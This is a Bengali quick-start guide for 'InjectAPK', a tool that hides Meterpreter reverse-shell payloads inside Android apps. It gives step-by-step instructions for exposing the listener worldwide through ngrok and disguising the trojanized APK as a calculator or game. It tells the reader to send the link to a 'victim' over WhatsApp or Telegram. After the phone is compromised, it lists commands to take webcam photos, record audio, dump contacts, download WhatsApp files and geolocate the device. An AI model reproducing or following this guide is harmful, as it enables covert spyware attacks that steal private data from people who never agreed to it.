# 🚀 InjectAPK - দ্রুত শুরু গাইড

**৫ মিনিটে হ্যাকিং শুরু করুন!**

---

## ⚡ সুপার ফাস্ট সেটআপ

### **১ মিনিটে ইনস্টল:**

```bash
# টার্মিনাল খুলুন
cd InjectAPK
sudo chmod +x Injectapk.sh
sudo ./Injectapk.sh
```

**ব্যাস! টুল চলছে!** 🎉

---

## 🌍 গ্লোবাল হ্যাকিং (যেকোনো দূরত্ব)

### **ধাপ ১: এনগ্রোক টোকেন নিন (৫ মিনিট)**

1. ব্রাউজারে যান: **https://dashboard.ngrok.com/signup**
2. ফ্রি অ্যাকাউন্ট খুলুন
3. Authtoken কপি করুন
4. নোটপ্যাডে সেভ করুন

### **ধাপ ২: টুল রান করুন**

```bash
sudo ./Injectapk.sh
```

### **ধাপ ৩: সেটিংস**

```
[✓] রুট চেক: ওকে
[✓] প্যাকেজ: ইনস্টল হয়ে গেছে

╔════════════════════════════════════════════════════╗
║         অ্যাটাক মোড সিলেক্ট করুন                  ║
╚════════════════════════════════════════════════════╝

1) Local Network (Same WiFi)
2) Global Attack (Any Distance)

Select mode [1-2]: 2          ← গ্লোবাল মোড!

[✓] এনগ্রোক অটোমেটিক ইনস্টল হয়েছে

Enter your Ngrok authtoken: YOUR_TOKEN_HERE  ← টোকেন পেস্ট করুন

LPORT: 4444

Select payload [1-4]: 3       ← HTTPS (সেরা!)

Select APK: 1                 ← যেকোনো অ্যাপ

Output name: myapp.apk
```

### **ধাপ ৪: লিংক পান**

```
🌍 GLOBAL DOWNLOAD URL: http://0.tcp.ngrok.io:12345/myapp.apk
This link works from ANYWHERE in the world!
```

### **ধাপ ৫: ভিক্টিমকে পাঠান**

হোয়াটসঅ্যাপ/টেলিগ্রামে লিংক পাঠান!

### **ধাপ ৬: হ্যাকড!**

```
[*] Meterpreter session 1 opened
meterpreter >
```

**🎉 সফল! ফোন আপনার কন্ট্রোলে!**

---

## 📱 লোকাল হ্যাকিং (একই ওয়াইফাই)

### **দ্রুত সেটআপ:**

```bash
sudo ./Injectapk.sh

# সেটিংস:
Attack Mode: 1          ← লোকাল
LHOST: (Enter চাপুন)   # অটো ডিটেক্ট
LPORT: 4444
Payload: 3              ← HTTPS
APK: 1                  ← সিলেক্ট করুন
```

**লিংক পাবেন:** `http://192.168.1.100/myapp.apk`

⚠️ **শুধু একই ওয়াইফাইতে কাজ করবে!**

---

## 🎮 জরুরি কমান্ড

### **ফোন কন্ট্রোল (সেশন ওপেন হলে):**

```bash
# ফোনের তথ্য
meterpreter > sysinfo

# ছবি তুলুন
meterpreter > webcam_snap

# স্ক্রিনশট
meterpreter > screenshot

# লোকেশন
meterpreter > geolocate

# ফাইল ডাউনলোড
meterpreter > download -r /sdcard/WhatsApp/

# কন্টাক্ট চুরি
meterpreter > dump_contacts

# অডিও রেকর্ড
meterpreter > record_mic -d 60
```

---

## 🔥 প্রো টিপস

### **স্টিলথ মোড (ডিটেকশন এড়াতে):**

✅ পেলোড: **3 (HTTPS)** ব্যবহার করুন  
✅ অ্যাপ: **ক্যালকুলেটর/গেম** ব্যবহার করুন  
✅ নাম: **সন্দেহজনক নয়** এমন দিন  
✅ পোর্ট: **443** ব্যবহার করুন (এইচটিটিপিএস)  

### **দ্রুত অ্যাক্সেস:**

```bash
# ব্যাকআপ ফোল্ডার
ls backup_*.apk

# লগ দেখুন
cat /tmp/inject.log

# এনগ্রোক স্ট্যাটাস
http://localhost:4040
```

---

## ⚠️ কমন এরর

### **"Permission Denied"**
```bash
sudo ./Injectapk.sh    ← sudo দিন!
```

### **"No APK found"**
```bash
# APK ফাইল কপি করুন
cp /path/to/app.apk .
```

### **"Ngrok failed"**
- ইন্টারনেট চেক করুন
- টোকেন সঠিক কিনা দেখুন
- আবার চালু করুন

---

## 📞 সাহায্য চান?

- 📘 **সম্পূর্ণ ম্যানুয়াল:** `USER_MANUAL_BN.md`
- 🎬 **ভিডিও:** YouTube: yt/mdismail
- 💬 **ইস্যু:** গিটহাবে রিপোর্ট করুন

---

## 🎯 উদাহরণ

### **বাংলাদেশ → আমেরিকা হ্যাক:**

```
আপনি: ঢাকা, বাংলাদেশ 🇧🇩
ভিক্টিম: নিউইয়র্ক, আমেরিকা 🇺🇸
দূরত্ব: ১২,০০০ কিমি

গ্লোবাল মোড ব্যবহার করুন!
→ লিংক পাঠান
→ ভিক্টিম ইনস্টল করল
→ সফল! 🎉

[*] Session opened from 45.67.89.123 (USA)
```

---

## 📊 কুইক রেফারেন্স

| কাজ | কমান্ড |
|-----|---------|
| টুল চালু | `sudo ./Injectapk.sh` |
| গ্লোবাল মোড | Mode: 2 |
| লোকাল মোড | Mode: 1 |
| পেলোড | 3 (HTTPS) |
| এনগ্রোক টোকেন | https://dashboard.ngrok.com |
| মিটারপ্রেটার | `sysinfo`, `webcam_snap`, `download` |

---

**🔥 এখন আপনি রেডি! হ্যাকিং শুরু করুন!**

---

*মেড বাই: Md Ismail*  
*ভার্সন: 2.0 Enhanced*
